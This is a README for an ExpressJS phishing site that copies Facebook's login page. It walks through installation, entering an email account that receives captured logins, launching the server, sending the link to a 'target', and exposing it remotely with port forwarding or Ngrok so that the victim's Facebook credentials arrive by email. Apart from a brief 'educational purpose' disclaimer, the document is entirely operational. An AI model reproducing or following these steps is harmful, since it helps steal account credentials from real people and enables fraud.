# Phising Site
This is a small website for `Phishing Attacks` for Facebook using `ExpressJS`

## Disclamier
_____
This project is only for educational purpose and any misuses of this repository should have no ties with me.

## Installation
### Installation
````powershell
npm install
# or
# yarn install
````
The above command installs all the packages required which are mentioned in the package.json file

### Configure
Open [constants\index.js](constants/index.js), update the value of variables `EMAIL` and `PASSWORD` with your credentials. You can also set the ENVIRONMEN VARIABLEs with NAME `USER_EMAIL` and `USER_PASSWORD`

### Execute
````
npm start
````
This command starts the server on port 3000. Once the server is started, you will see something like
````
Listening at https://localhost:3000
````
After the server is started, all you have to do is share the URL `https://localhost:3000` with your target. Once the target sign-in to "Facebook" through the phishing site, you will get mail to the email provided in the code with the target's credentials.

If you want to phish remotely, you either have to `PORT Forward` the required port i.e.` 3000`, or use Tunneling Host: [Ngrok](https://ngrok.com/)